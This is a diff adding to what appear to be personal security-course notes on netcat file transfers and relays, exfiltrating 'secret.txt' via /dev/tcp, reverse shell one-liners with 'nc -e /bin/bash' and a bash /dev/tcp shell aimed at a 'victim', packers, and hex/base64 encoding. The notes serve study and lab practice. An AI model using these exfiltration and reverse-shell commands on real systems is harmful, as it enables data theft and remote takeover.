@@ -76,6 +76,67 @@ Relay Netcat :
           nc 172.16.82.106 1111 < secret.txt *OR* nc -lvp 1111 -- just gonna print to screen so not very useful except to check the pipe is built correct(same for reciever)
   (host3)Recieve: 
           nc 192.168.1.1 3333 > newsecret.txt *OR*
+**Client-Client**
+Host1(Send):
+  nc -lvp 1111 < secret.txt
+host2(recieve):
+  nc -lvp 3333 > newsecret.txt
+host3(Relay):
+  mknod mypipe p
+  nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+
+No Netcat?
+Recieve:
+nc -lvp 1111 > devtcpfile.txt
+Send:
+cat secret.txt > /dev/tcp/10.10.0.40/1111
+
+Reverse Shell
+me:
+  nc -lvp 9999
+victim 1:
+  nc -c /bin/bash 10.10.0.40 9999
+victim 2:
+  nc -e /bin/bash 10.10.0.40 9999
+
+Reverse Shell with /DEV/TCP
+Listen:
+  nc -lvp 9999
+Victim:
+  /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+
+Packers
+  Special code to compress executables
+  Reduce network traffic
+  Used for obfuscation
+  Reduce time on target
+
+Encode/Decode
+  Transmission/Storage
+  Hex/Base64 most common
+  Not Compression, Not encapsulation, Not Encryption
+
+HEX encoding/decoding
+  convert binary to hex
+  IPv6/MAC addresses
+  xxd -p convert to hex
+  xxd -r -p hex to plain
+
+Base64 Encode/Decode
+  A-Z, a-z, 1-9, +, /
+  uses "==" as padding
+  Generate base64 output /w no line wrapping:
+    base64 -w0 logoCyber.png
+  Decode base64:
+    base64 -d b64image.png > logoCyber.png
+
+
+
+
+
+
+
+
 
 
 
